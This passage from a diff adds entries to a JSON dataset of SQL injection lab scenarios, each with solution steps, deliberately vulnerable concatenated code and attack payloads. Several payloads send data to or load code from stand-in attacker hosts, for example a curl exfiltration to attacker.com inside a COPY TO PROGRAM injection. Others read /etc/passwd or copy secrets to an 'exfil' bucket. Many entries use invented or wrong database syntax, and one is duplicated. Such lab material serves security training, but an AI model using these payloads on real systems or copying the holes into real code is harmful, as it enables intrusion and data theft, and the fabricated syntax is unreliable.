+                        "res => res.map(row => ({...row, extra: execute('SHOW PARAMETERS')}))"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Databricks Asset Bundle Runtime Parameters",
+                      "Lab Description": "A deployment pipeline configures Databricks bundles with dynamic runtime args. The parameter strings are concatenated directly into job execution.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify bundle.yml usage",
+                        "Inject through runtime parameters",
+                        "Bypass YAML validation",
+                        "Access cluster environment",
+                        "Execute arbitrary notebooks"
+                      ],
+                      "Vulnerability name": "Databricks Bundle Injection",
+                      "srcCode": "resources: jobs: my_job: runtime_params: '\\'' + userParams + '\\''",
+                      "payloads": [
+                        "key:value') FROM system.bundles --",
+                        "malicious: $(cat /etc/passwd)"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Trino Iceberg Metadata Procedures",
+                      "Lab Description": "A data lakehouse executes Iceberg procedures with dynamic arguments. The parameters are concatenated directly into metadata operations.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CALL iceberg.system usage",
+                        "Inject through procedure arguments",
+                        "Bypass namespace validation",
+                        "Tamper with table metadata",
+                        "Access underlying files"
+                      ],
+                      "Vulnerability name": "Trino Iceberg Procedure Injection",
+                      "srcCode": "CALL iceberg.system.procedure('\\'' + userArgs + '\\'')",
+                      "payloads": [
+                        "snapshots') FROM iceberg.information_schema.tables --",
+                        "expire_snapshots(table => 'sensitive'))"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Presto Thrift UDF Payloads",
+                      "Lab Description": "A distributed system registers Thrift UDFs with dynamic serialization. The payload strings are concatenated directly into function execution.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify Thrift UDF registration",
+                        "Inject through serialized payloads",
+                        "Bypass deserialization checks",
+                        "Execute arbitrary code",
+                        "Access worker nodes"
+                      ],
+                      "Vulnerability name": "Presto Thrift UDF Injection",
+                      "srcCode": "CREATE FUNCTION my_func RETURNS string TYPE thrift LANGUAGE thrift HANDLER '\\'' + userHandler + '\\''",
+                      "payloads": [
+                        "attacker.com:8080/Exploit.class",
+                        "java -jar malicious.jar"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in ClickHouse Kafka Engine Settings",
+                      "Lab Description": "A streaming pipeline creates Kafka tables with dynamic engine settings. The configuration strings are concatenated directly into consumer initialization.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify CREATE TABLE ENGINE=Kafka",
+                        "Inject through settings parameters",
+                        "Bypass broker validation",
+                        "Access unauthorized topics",
+                        "Poison message streams"
+                      ],
+                      "Vulnerability name": "ClickHouse Kafka Injection",
+                      "srcCode": "CREATE TABLE kafka_table ENGINE = Kafka('\\'' + userSettings + '\\'')",
+                      "payloads": [
+                        "attacker.com:9092') FROM system.kafka_tables --",
+                        "legit:9092, topic=secret')) SETTINGS kafka_skip_broken_messages=1"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in SingleStore Pipelines Transformation Scripts",
+                      "Lab Description": "A real-time pipeline creates data transformations with dynamic JavaScript scripts. The script code is concatenated directly into stream processing.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CREATE PIPELINE usage",
+                        "Inject through TRANSFORM scripts",
+                        "Bypass sandbox restrictions",
+                        "Execute arbitrary code",
+                        "Access source streams"
+                      ],
+                      "Vulnerability name": "SingleStore Script Injection",
+                      "srcCode": "CREATE PIPELINE my_pipe AS TRANSFORM ('\\'' + userScript + '\\'') FROM src INTO dst",
+                      "payloads": [
+                        "function transform() { return execute('SELECT * FROM information_schema.tables'); }",
+                        "() => ({ sql: 'SHOW DATABASES' })"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in YugabyteDB CDC Stream IDs",
+                      "Lab Description": "A change data capture system creates YugabyteDB streams with dynamic identifiers. The ID strings are concatenated directly into WAL processing.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify CREATE CDC STREAM usage",
+                        "Inject through stream ID parameters",
+                        "Bypass WAL validation",
+                        "Access unauthorized changes",
+                        "Tamper with replication"
+                      ],
+                      "Vulnerability name": "Yugabyte Stream ID Injection",
+                      "srcCode": "EXECUTE PROCEDURE yb_create_change_data_stream('\\'' + userStreamId + '\\'')",
+                      "payloads": [
+                        "all_tables\") FROM yb_servers--",
+                        "sensitive_db')); SELECT * FROM yb_metrics--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in CrateDB Dynamic Partition Columns",
+                      "Lab Description": "A distributed SQL system creates partitioned tables with dynamic column names. The partition expressions are concatenated directly into shard allocation.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify PARTITIONED BY usage",
+                        "Inject through column parameters",
+                        "Bypass shard validation",
+                        "Manipulate data distribution",
+                        "Access unauthorized shards"
+                      ],
+                      "Vulnerability name": "CrateDB Partition Injection",
+                      "srcCode": "CREATE TABLE partitioned_data (col1 INT) PARTITIONED BY ('\\'' + userColumn + '\\'')",
+                      "payloads": [
+                        "col1\") FROM information_schema.tables--",
+                        "date_trunc('day', ts)')) CLUSTERED INTO 10 SHARDS--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in TiDB Placement Policy Constraints",
+                      "Lab Description": "A distributed database configures placement policies with dynamic constraints. The constraint strings are concatenated directly into region placement.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CREATE PLACEMENT POLICY usage",
+                        "Inject through CONSTRAINTS clauses",
+                        "Bypass region validation",
+                        "Manipulate replica placement",
+                        "Access cross-region data"
+                      ],
+                      "Vulnerability name": "TiDB Placement Injection",
+                      "srcCode": "CREATE PLACEMENT POLICY my_policy CONSTRAINTS = '\\'' + userConstraints + '\\''",
+                      "payloads": [
+                        "+region=us-west) FROM information_schema.placement_policies--",
+                        "+zone=1')) LEADER_CONSTRAINTS='+region=attacker'--"
+                      ]
+                    },
+
+
+
+
+
+                    
+                      {
+                          "Lab scenario": "SQL Injection in MySQL Generated Column Expressions",
+                          "Lab Description": "A schema designer dynamically creates generated columns with unsafe expression concatenation, allowing injection through virtual column definitions.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Identify generated column creation",
+                              "Inject malicious expression via AS clause",
+                              "Bypass expression validation",
+                              "Access underlying table data",
+                              "Exfiltrate through computed values"
+                          ],
+                          "Vulnerability name": "MySQL Virtual Column Injection",
+                          "srcCode": "ALTER TABLE users ADD COLUMN full_name VARCHAR(255) AS (CONCAT('\\'' + userExpr + '\\'')) STORED",
+                          "payloads": [
+                              "first_name,' ',last_name)) FROM mysql.user--",
+                              "first_name,(SELECT @@version),last_name))--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in SQL Server Graph MATCH Path Filters",
+                          "Lab Description": "A social network application builds graph queries with unsanitized node property filters, allowing injection during relationship traversal.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate MATCH clause construction",
+                              "Inject through node property filters",
+                              "Bypass graph syntax validation",
+                              "Access unauthorized graph nodes",
+                              "Exfiltrate connection data"
+                          ],
+                          "Vulnerability name": "SQL Graph Traversal Injection",
+                          "srcCode": "MATCH (n {user_id: '\\'' + userFilter + '\\''})-[r:FOLLOWS]->(m)",
+                          "payloads": [
+                              "123' OR 1=1)--",
+                              "admin'}) RETURN n.password--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in PostgreSQL COPY TO PROGRAM Commands",
+                          "Lab Description": "A data export feature unsafely incorporates user input into COPY TO PROGRAM statements, enabling OS command execution.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Identify COPY TO PROGRAM usage",
+                              "Inject shell metacharacters",
+                              "Bypass command filtering",
+                              "Execute system commands",
+                              "Exfiltrate via command output"
+                          ],
+                          "Vulnerability name": "PostgreSQL COPY Command Injection",
+                          "srcCode": "COPY (SELECT * FROM logs) TO PROGRAM 'gzip > /exports/\\'' + userFilename + '\\''",
+                          "payloads": [
+                              "reports_2023.gz; curl attacker.com/?exfil=$(ls|base64)--",
+                              "legit.gz' || whoami > /tmp/leak || '"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Oracle Text INDEX PARAMETERS",
+                          "Lab Description": "A document search system unsafely builds Oracle Text index parameters, allowing injection during index creation.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate CREATE INDEX usage",
+                              "Inject through PARAMETERS clause",
+                              "Bypass CTXSYS privilege checks",
+                              "Manipulate search results",
+                              "Access indexed documents"
+                          ],
+                          "Vulnerability name": "Oracle Text Parameter Injection",
+                          "srcCode": "CREATE INDEX doc_idx ON docs(text) INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS ('\\'' + userParams + '\\'')",
+                          "payloads": [
+                              "SYNC (EVERY \"SYSDATE+0/1440\") FROM all_indexes--",
+                              "STOPLIST ctxsys.empty_stoplist')) SELECT * FROM user_tables--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Snowflake External Table Column Definitions",
+                          "Lab Description": "A cloud ETL pipeline dynamically defines external table columns with unsanitized input, allowing injection during schema inference.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Identify external table creation",
+                              "Inject through column definitions",
+                              "Bypass schema validation",
+                              "Access unauthorized storage paths",
+                              "Manipulate query results"
+                          ],
+                          "Vulnerability name": "Snowflake External Schema Injection",
+                          "srcCode": "CREATE EXTERNAL TABLE ext_data (\\'' + userCols + '\\'') LOCATION=@stage",
+                          "payloads": [
+                              "id INT) FROM information_schema.external_tables--",
+                              "name STRING, (SELECT * FROM sensitive_data) x)"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in BigQuery JSON_EXTRACT_SCALAR Path Parameters",
+                          "Lab Description": "A JSON processing feature unsafely incorporates user input into JSON path expressions, allowing injection during document parsing.",
+                          "Difficulty Level": "Easy",
+                          "Solution Steps": [
+                              "Locate JSON_EXTRACT_SCALAR usage",
+                              "Inject malicious JSON path",
+                              "Bypass path validation",
+                              "Access unauthorized JSON fields",
+                              "Exfiltrate via malformed paths"
+                          ],
+                          "Vulnerability name": "BigQuery JSON Path Injection",
+                          "srcCode": "SELECT JSON_EXTRACT_SCALAR(payload, '\\'' + userPath + '\\'') FROM events",
+                          "payloads": [
+                              "$.private.email FROM `project.dataset.users`--",
+                              "$[0]')) WHERE 1=0 UNION SELECT 1,2,3--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Azure Synapse CETAS WITH Clauses",
+                          "Lab Description": "A data warehouse exports tables with dynamic WITH options, allowing injection during external table creation.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Identify CETAS usage",
+                              "Inject through WITH parameters",
+                              "Bypass option validation",
+                              "Modify file output properties",
+                              "Exfiltrate via storage paths"
+                          ],
+                          "Vulnerability name": "Synapse CETAS Option Injection",
+                          "srcCode": "CREATE EXTERNAL TABLE ext_data WITH ('\\'' + userOptions + '\\'') AS SELECT * FROM source",
+                          "payloads": [
+                              "FORMAT='PARQUET') FROM sys.external_tables--",
+                              "LOCATION='wasbs://attacker@storage.blob.core.windows.net/exfil'))"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Databricks Notebook Widget Default Values",
+                          "Lab Description": "An interactive notebook incorporates unsanitized widget defaults into SQL cells, allowing injection through UI parameters.",
+                          "Difficulty Level": "Easy",
+                          "Solution Steps": [
+                              "Locate widget creation",
+                              "Inject through default values",
+                              "Bypass notebook sanitization",
+                              "Execute arbitrary queries",
+                              "Access cluster metadata"
+                          ],
+                          "Vulnerability name": "Databricks Widget Injection",
+                          "srcCode": "dbutils.widgets.text('input', '\\'' + userDefault + '\\'')",
+                          "payloads": [
+                              "1' UNION SELECT * FROM hive_metastore.default.passwords--",
+                              "legit' || (SELECT current_user()) || '"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Amazon Redshift UNLOAD IAM_ROLE Parameters",
+                          "Lab Description": "A data export feature unsafely incorporates user input into UNLOAD statements, allowing IAM role manipulation.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Identify UNLOAD commands",
+                              "Inject through IAM_ROLE parameter",
+                              "Bypass ARN validation",
+                              "Access unauthorized S3 buckets",
+                              "Exfiltrate via modified destinations"
+                          ],
+                          "Vulnerability name": "Redshift IAM Role Injection",
+                          "srcCode": "UNLOAD ('SELECT * FROM sensitive') TO 's3://bucket/path' IAM_ROLE '\\'' + userRole + '\\''",
+                          "payloads": [
+                              "arn:aws:iam::123456789012:role/RedshiftReadOnly') FROM svv_external_tables--",
+                              "arn:aws:iam::attacker:role/MaliciousRole'))"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Google Cloud Spanner INTERLEAVE IN PARENT Clauses",
+                          "Lab Description": "A schema migration tool unsafely builds INTERLEAVE clauses, allowing injection during table relationship creation.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate INTERLEAVE usage",
+                              "Inject through parent table parameters",
+                              "Bypass schema validation",
+                              "Modify table relationships",
+                              "Access unauthorized datasets"
+                          ],
+                          "Vulnerability name": "Spanner Interleave Injection",
+                          "srcCode": "CREATE TABLE child_table INTERLEAVE IN PARENT '\\'' + userParent + '\\'' ON DELETE CASCADE",
+                          "payloads": [
+                              "parent_table' FROM information_schema.tables--",
+                              "legit_table')) SELECT * FROM SPANNER_SYS.TABLES--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Azure Data Explorer Kusto Function Bodies",
+                          "Lab Description": "A query optimization system dynamically creates Kusto functions with unsanitized bodies, allowing injection during execution.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Identify function creation",
+                              "Inject through function logic",
+                              "Bypass sandbox restrictions",
+                              "Access unauthorized data",
+                              "Execute arbitrary KQL"
+                          ],
+                          "Vulnerability name": "Kusto Function Body Injection",
+                          "srcCode": ".create function my_func() { '\\'' + userLogic + '\\'' }",
+                          "payloads": [
+                              "union cluster('attacker').database('exfil').table('dump')",
+                              "table(T) | where 1=0 union (show databases)"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Connection Strings",
+                          "Lab Description": "A reporting tool builds ODBC connections with unsanitized input, allowing injection during driver initialization.",
+                          "Difficulty Level": "Easy",
+                          "Solution Steps": [
+                              "Locate connection string construction",
+                              "Inject through properties",
+                              "Bypass driver validation",
+                              "Access restricted indices",
+                              "Exfiltrate via error messages"
+                          ],
+                          "Vulnerability name": "Elasticsearch ODBC Connection Injection",
+                          "srcCode": "Driver={Elasticsearch ODBC};Server='\\'' + userServer + '\\'';UID='\\'' + userUID + '\\''",
+                          "payloads": [
+                              "attacker.com;Properties=\"Security=Disabled\"",
+                              "legit.com:9200\";PWD=' OR '1'='1'--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
+                          "Lab Description": "A dashboard builder improperly escapes Druid SQL identifiers, allowing injection through quoted table names.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate dynamic identifier usage",
+                              "Inject through escape sequences",
+                              "Bypass parser validation",
+                              "Access system tables",
+                              "Execute native queries"
+                          ],
+                          "Vulnerability name": "Druid Identifier Escape Injection",
+                          "srcCode": "SELECT * FROM \\\"\\'' + userTable + '\\''\\\"",
+                          "payloads": [
+                              "datasource\\\" FROM (SELECT * FROM sys.segments) x--",
+                              "legit_table\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in InfluxDB Flux Yield Names",
+                          "Lab Description": "A monitoring system dynamically names Flux query yields, allowing injection during result processing.",
+                          "Difficulty Level": "Easy",
+                          "Solution Steps": [
+                              "Locate yield statements",
+                              "Inject through name parameter",
+                              "Bypass name validation",
+                              "Modify result sets",
+                              "Exfiltrate via yielded output"
+                          ],
+                          "Vulnerability name": "Flux Yield Name Injection",
+                          "srcCode": "from(bucket:\\\"metrics\\\") |> yield(name: \\\"\\'' + userYield + '\\\"\\\")",
+                          "payloads": [
+                              "results\\\" FROM (SELECT * FROM _internal.monitor)--",
+                              "data\\\" WHERE 1=0) UNION SELECT 1--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Policies",
+                          "Lab Description": "A time-series platform configures aggregation policies with unsanitized input, allowing injection during materialization.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate policy creation",
+                              "Inject through interval parameters",
+                              "Bypass time validation",
+                              "Trigger unauthorized refreshes",
+                              "Access historical data"
+                          ],
+                          "Vulnerability name": "Timescale Policy Injection",
+                          "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
+                          "payloads": [
+                              "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
+                              "sensitive_data', INTERVAL '0 seconds')))"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in CockroachDB Partial Index Predicates",
+                          "Lab Description": "A performance optimization feature unsafely creates partial indexes, allowing injection through WHERE clauses.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate partial index creation",
+                              "Inject through predicate",
+                              "Bypass expression validation",
+                              "Access filtered data",
+                              "Exfiltrate via index scans"
+                          ],
+                          "Vulnerability name": "Cockroach Partial Index Injection",
+                          "srcCode": "CREATE INDEX idx_filtered ON table (col) WHERE '\\'' + userPredicate + '\\''",
+                          "payloads": [
+                              "status = 'active' FROM crdb_internal.indexes--",
+                              "1=1)) STORING (password)--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
+                          "Lab Description": "A data pipeline configures S3 endpoints with unsanitized input, allowing injection during cloud storage operations.",
+                          "Difficulty Level": "Easy",
+                          "Solution Steps": [
+                              "Locate S3 configuration",
+                              "Inject through endpoint URLs",
+                              "Bypass URL validation",
+                              "Access unauthorized buckets",
+                              "Exfiltrate credentials"
+                          ],
+                          "Vulnerability name": "DuckDB S3 Endpoint Injection",
+                          "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
+                          "payloads": [
+                              "attacker.com') FROM duckdb_settings--",
+                              "legit.s3.amazonaws.com'; COPY secrets TO 's3://exfil/'--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Materialized View Refresh Options",
+                          "Lab Description": "A data warehouse refreshes materialized views with dynamic options, allowing injection during data reload.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate REFRESH commands",
+                              "Inject through WITH parameters",
+                              "Bypass option validation",
+                              "Trigger full table scans",
+                              "Access underlying data"
+                          ],
+                          "Vulnerability name": "Materialized View Refresh Injection",
+                          "srcCode": "REFRESH MATERIALIZED VIEW mv WITH ('\\'' + userOptions + '\\'')",
+                          "payloads": [
+                              "NO DATA') FROM pg_matviews--",
+                              "DATA')) CONCURRENTLY"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
+                          "Lab Description": "A blockchain application creates ledger views with dynamic options, allowing injection during cryptographic verification.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate LEDGER VIEW creation",
+                              "Inject through view parameters",
+                              "Bypass blockchain validation",
+                              "Tamper with historical records",
+                              "Disable verification"
+                          ],
+                          "Vulnerability name": "SQL Ledger View Injection",
+                          "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
+                          "payloads": [
+                              "VERIFICATION = ON) FROM sys.ledger_views--",
+                              "TRANSACTION_ID_COLUMN = id)))"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in BigQuery Wildcard Table Suffixes",
+                          "Lab Description": "A data analytics tool uses wildcard tables with dynamic suffixes, allowing injection during table expansion.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate wildcard table usage",
+                              "Inject through suffix patterns",
+                              "Bypass pattern validation",
+                              "Access unauthorized datasets",
+                              "Exfiltrate via table scans"
+                          ],
+                          "Vulnerability name": "BigQuery Wildcard Injection",
+                          "srcCode": "SELECT * FROM `project.dataset.table_\\'' + userSuffix + '\\'`",
+                          "payloads": [
+                              "2023*` FROM `region-us`.INFORMATION_SCHEMA.TABLES--",
+                              "jan` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
+                          "Lab Description": "A configuration system sets session parameters with dynamic defaults, allowing injection during session initialization.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate parameter setting",
+                              "Inject through default values",
+                              "Bypass parameter validation",
+                              "Persist malicious settings",
+                              "Affect all subsequent queries"
+                          ],
+                          "Vulnerability name": "Snowflake Session Default Injection",
+                          "srcCode": "ALTER SESSION SET '\\'' + userParam + '\\'' = '\\'' + userValue + '\\''",
+                          "payloads": [
+                              "TIMESTAMP_INPUT_FORMAT', 'YYYY-MM-DD') FROM information_schema.parameters--",
+                              "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
+                          "Lab Description": "A cluster management system configures warehouses with dynamic parameters, allowing injection during cluster startup.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate warehouse creation",
+                              "Inject through config options",
+                              "Bypass config validation",
+                              "Access driver nodes",
+                              "Exfiltrate metastore data"
+                          ],
+                          "Vulnerability name": "Databricks Warehouse Config Injection",
+                          "srcCode": "CREATE WAREHOUSE my_warehouse WITH ('\\'' + userConfig + '\\'')",
+                          "payloads": [
+                              "AUTO_STOP = 1200) FROM system.metastore.warehouses--",
+                              "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
+                          "Lab Description": "A UDF registration system dynamically specifies function namespaces, allowing injection during function creation.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate function creation",
+                              "Inject through namespace paths",
+                              "Bypass namespace validation",
+                              "Execute arbitrary functions",
+                              "Access system catalogs"
+                          ],
+                          "Vulnerability name": "Trino Namespace Injection",
+                          "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
+                          "payloads": [
+                              "system', 'return 1') FROM system.metadata.catalogs--",
+                              "pg_catalog', 'SELECT * FROM pg_user')--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in Presto Table Function Arguments",
+                          "Lab Description": "A query system uses table functions with dynamic arguments, allowing injection during function execution.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate table function usage",
+                              "Inject through argument strings",
+                              "Bypass argument validation",
+                              "Modify result sets",
+                              "Access system tables"
+                          ],
+                          "Vulnerability name": "Presto Table Function Injection",
+                          "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
+                          "payloads": [
+                              "SELECT 1')) FROM system.runtime.nodes--",
+                              "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
+                          "Lab Description": "A data loading system configures dictionaries with dynamic source URLs, allowing injection during dictionary loading.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate dictionary creation",
+                              "Inject through URL parameters",
+                              "Bypass URL validation",
+                              "Access remote systems",
+                              "Modify dictionary content"
+                          ],
+                          "Vulnerability name": "ClickHouse Dictionary URL Injection",
+                          "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\'' + userUrl + '\\'')))",
+                          "payloads": [
+                              "http://attacker.com/payload')) FROM system.dictionaries--",
+                              "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in SingleStore Columnstore Compression",
+                          "Lab Description": "A columnar storage system configures compression with dynamic parameters, allowing injection during table optimization.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate compression settings",
+                              "Inject through compression clauses",
+                              "Bypass parameter validation",
+                              "Manipulate storage format",
+                              "Access encoded data"
+                          ],
+                          "Vulnerability name": "SingleStore Compression Injection",
+                          "srcCode": "ALTER TABLE table_name COLUMNSTORE ('\\'' + userOptions + '\\'')",
+                          "payloads": [
+                              "COMPRESSION='LZ4') FROM information_schema.tables--",
+                              "SORT KEY=(id))) FROM (SELECT * FROM sensitive_data)"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in YugabyteDB CDC Stream Filters",
+                          "Lab Description": "A change data capture system creates streams with dynamic filters, allowing injection during change event generation.",
+                          "Difficulty Level": "Medium",
+                          "Solution Steps": [
+                              "Locate stream creation",
+                              "Inject through filter expressions",
+                              "Bypass CDC validation",
+                              "Access unauthorized changes",
+                              "Exfiltrate via change events"
+                          ],
+                          "Vulnerability name": "Yugabyte CDC Filter Injection",
+                          "srcCode": "CREATE CHANGEFEED FOR TABLE table_name WHERE '\\'' + userFilter + '\\''",
+                          "payloads": [
+                              "id > 0) FROM yb_cdc_state--",
+                              "1=1)) WITH ('format'='json')"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in CrateDB Fulltext Analyzer Definitions",
+                          "Lab Description": "A search system creates custom analyzers with dynamic configurations, allowing injection during text processing.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate analyzer creation",
+                              "Inject through analyzer parameters",
+                              "Bypass analyzer validation",
+                              "Manipulate search results",
+                              "Access indexed content"
+                          ],
+                          "Vulnerability name": "CrateDB Analyzer Injection",
+                          "srcCode": "CREATE ANALYZER my_analyzer ('\\'' + userConfig + '\\'')",
+                          "payloads": [
+                              "tokenizer standard')) FROM information_schema.analyzers--",
+                              "filters lowercase')) FROM (SELECT * FROM sys.nodes)"
+                          ]
+                      },
+                      {
+                          "Lab scenario": "SQL Injection in TiDB Placement Policy Constraints",
+                          "Lab Description": "A distributed database configures placement policies with dynamic constraints, allowing injection during replica distribution.",
+                          "Difficulty Level": "Hard",
+                          "Solution Steps": [
+                              "Locate policy creation",
+                              "Inject through constraint expressions",
+                              "Bypass region validation",
+                              "Manipulate replica placement",
+                              "Access cross-region data"
+                          ],
+                          "Vulnerability name": "TiDB Placement Injection",
+                          "srcCode": "CREATE PLACEMENT POLICY my_policy CONSTRAINTS = '\\'' + userConstraints + '\\''",
+                          "payloads": [
+                              "+region=us-west') FROM information_schema.placement_policies--",
+                              "+zone=1')) LEADER_CONSTRAINTS='+region=attacker'--"
+                          ]
+                      },
+
+
+
+                      
+                        {
+                            "Lab scenario": "SQL Injection in PostgreSQL CREATE TEXT SEARCH TEMPLATE",
+                            "Lab Description": "A search system dynamically creates text search templates with unsafe lexize function parameters, allowing code execution during document processing.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify CREATE TEXT SEARCH TEMPLATE usage",
+                                "Inject through lexize function parameter",
+                                "Bypass C function validation",
+                                "Execute arbitrary code in search operations",
+                                "Compromise full-text indexes"
+                            ],
+                            "Vulnerability name": "PostgreSQL Search Template Injection",
+                            "srcCode": "CREATE TEXT SEARCH TEMPLATE my_template (LEXIZE = '\\'' + userLexize + '\\'')",
+                            "payloads": [
+                                "dsimple_lexize') FROM pg_ts_template--",
+                                "shell_exec,'/bin/bash')--"
+                            ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in MySQL Clone Plugin Data Filtering",
+                            "Lab Description": "A database cloning tool incorporates user input into CLONE DATA FILTER clauses without sanitization, allowing injection during clone operations.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify CLONE INSTANCE commands",
+                                "Inject through DATA FILTER parameter",
+                                "Bypass clone validation checks",
+                                "Access source server data",
+                                "Tamper with cloned content"
+                            ],
+                            "Vulnerability name": "MySQL Clone Filter Injection",
+                            "srcCode": "CLONE LOCAL DATA DIRECTORY = '/backups' DATA FILTER = '\\'' + userFilter + '\\''",
+                            "payloads": [
+                                                      "EXCLUDE_SCHEMAS: ['mysql'] FROM clone_progress--",
+                                                      "INCLUDE_TABLES: ['%.secrets']))--"
+                                                  ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in SQL Server Ledger History Retention",
+                            "Lab Description": "A blockchain application dynamically configures ledger history retention periods without proper sanitization, allowing tampering with immutable records.",
+                            "Difficulty Level": "Hard",
+                            "Solution Steps": [
+                                "Identify ALTER LEDGER statements",
+                                "Inject through retention period parameter",
+                                "Bypass blockchain validation",
+                                "Purge historical records",
+                                "Disable cryptographic verification"
+                            ],
+                            "Vulnerability name": "SQL Ledger Retention Injection",
+                            "srcCode": "ALTER LEDGER ledger_name SET (LEDGER_RETENTION = '\\'' + userRetention + '\\'')",
+                              "payloads": [
+                                        "INFINITE') FROM sys.ledger_blocks--",
+                                        "0 DAYS'))) WITH (VERIFICATION = OFF)"
+                              ]
+                        },
+                        {
+                            "Lab scenario": "SQL Injection in Oracle SDO_NET Memory Parameters",
+                            "Lab Description": "A spatial network application dynamically configures memory parameters for network analysis without proper sanitization, allowing arbitrary PL/SQL execution.",
+                            "Difficulty Level": "Easy",
+                            "Solution Steps": [
+                                "Identify SDO_NET.CREATE_NETWORK calls",
